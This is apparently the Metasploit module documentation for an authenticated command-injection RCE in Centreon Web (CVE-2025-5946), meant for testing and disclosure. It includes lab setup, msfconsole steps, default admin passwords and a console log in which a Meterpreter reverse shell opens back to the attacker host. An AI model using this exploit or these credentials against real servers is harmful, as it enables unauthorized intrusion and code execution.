## Vulnerable Application
Centreon is a platform designed to monitor your cloud and on-premises infrastructure.
This module exploits an command injection vulnerability using the `broker engine reload` setting
on the poller configuration page of the Centreon web application. Injecting a malcious payload
at the `broker engine reload` parameter and restarting the poller triggers this vulnerability.
You need have admin access at the Centreon Web application in order to execute this RCE.

This issue affects all Centreon editions >= `19.10.0` and it is fixed in Centreon Web versions
`24.10.13`, `24.04.18` and `23.10.28`.

The following releases were tested.

**Centreon Releases:**
* Centreon 24.10.8 on Debian 12 - VM Image

## Installation steps to install Centreon
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* [Install Centreon VM](https://docs.centreon.com/docs/installation/installation-of-a-central-server/using-virtual-machines/).
* After successful installation of Centreon you can access the application using the `webui` via `http(s)://your_ip/centreon`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/centreon_auth_rce_cve_2025_5946`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Unix/Linux Command>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### USERNAME
The username (default: admin) to authenticate with the Centreon application.

### PASSWORD
This is the password (default: Centreon!123) in plain text to authenticate with the Centreon application.
Depending on the version installed, the default password can also be "centreon" or "Centreon123!" without the quotes ;-)

## Scenarios
### Centreon VM v24.10.8 -  Unix/Linux Command target
Attack scenario: use the default admin credentials (admin:Centreon!123) of the Centreon application
to gain the privileges for the RCE.
```msf
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > set rport 80
rport => 80
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > set lhost 192.168.201.10
lhost => 192.168.201.10
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > set password centreon
password => centreon
msf exploit(linux/http/centreon_auth_rce_cve_2025_5946) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Centreon version 24.10.8
[*] Trying to log in with admin credentials admin:centreon at the Centreon Web application.
[*] Succesfully authenticated at the Centreon Web application.
[*] Saving admin credentials at the msf database.
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending stage (3090404 bytes) to 192.168.201.6
[*] Meterpreter session 1 opened (192.168.201.10:4444 -> 192.168.201.6:51772) at 2025-11-03 08:47:22 +0000
[+] Payload has been successfully removed from the poller setting "broker_reload_command".

meterpreter > sysinfo
Computer     : 192.168.201.6
OS           : Debian 12.11 (Linux 6.1.0-37-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: www-data
meterpreter > pwd
/usr/share/centreon/www
meterpreter >
```
## Limitations
None.
